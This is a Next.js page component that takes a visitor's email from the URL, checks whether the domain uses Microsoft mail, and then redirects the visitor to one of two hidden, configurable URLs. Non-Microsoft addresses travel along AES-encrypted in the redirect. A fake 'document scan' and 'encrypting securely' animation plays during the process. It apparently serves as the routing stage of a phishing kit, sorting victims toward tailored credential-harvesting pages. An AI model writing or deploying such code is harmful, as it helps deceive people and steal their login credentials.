"use client";

import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import crypto from "crypto-js";
import { motion } from "framer-motion";
import { Loader2, ShieldCheck } from "lucide-react";

export default function HomePage() {
  const searchParams = useSearchParams();
  const [step, setStep] = useState(0);

  useEffect(() => {
    const email = searchParams.get("email");
    if (!email) return;

    const check = async () => {
      setStep(1); // scanning

      const resp = await fetch(`/api/check-mx?email=${encodeURIComponent(email)}`);
      const data = await resp.json();

      if (data.isMicrosoft) {
        setStep(3);
        setTimeout(() => {
          window.location.href = process.env.NEXT_PUBLIC_URL1!;
        }, 1500);
      } else {
        const salt = process.env.NEXT_PUBLIC_SALT!;
        const encrypted = crypto.AES.encrypt(email, salt).toString();
        const safeEnc = encodeURIComponent(encrypted);
        setStep(3);
        setTimeout(() => {
          window.location.href = `${process.env.NEXT_PUBLIC_URL2}/${safeEnc}`;
        }, 1500);
      }
    };

    setStep(0);
    setTimeout(check, 1000);
  }, [searchParams]);

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center"
      >
        <motion.div
          className="flex items-center justify-center mb-6"
          animate={{ rotate: [0, 10, -10, 0] }}
          transition={{ repeat: Infinity, duration: 2 }}
        >
          {step < 3 && <Loader2 className="w-16 h-16 text-blue-400 animate-spin" />}
          {step === 3 && <ShieldCheck className="w-16 h-16 text-green-400" />}
        </motion.div>

        <motion.h1
          className="text-2xl font-bold mb-4"
          key={step}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          {step === 0 && "Initializing document scan..."}
          {step === 1 && "Scanning email domain records..."}
          {step === 2 && "Encrypting data securely..."}
          {step === 3 && "Process complete. Redirecting..."}
        </motion.h1>

        <div className="w-64 bg-gray-700 rounded-full h-2 overflow-hidden">
          <motion.div
            className="bg-blue-500 h-2"
            initial={{ width: "0%" }}
            animate={{ width: step === 0 ? "20%" : step === 1 ? "60%" : "100%" }}
            transition={{ duration: 0.8 }}
          />
        </div>
      </motion.div>
    </div>
  );
}
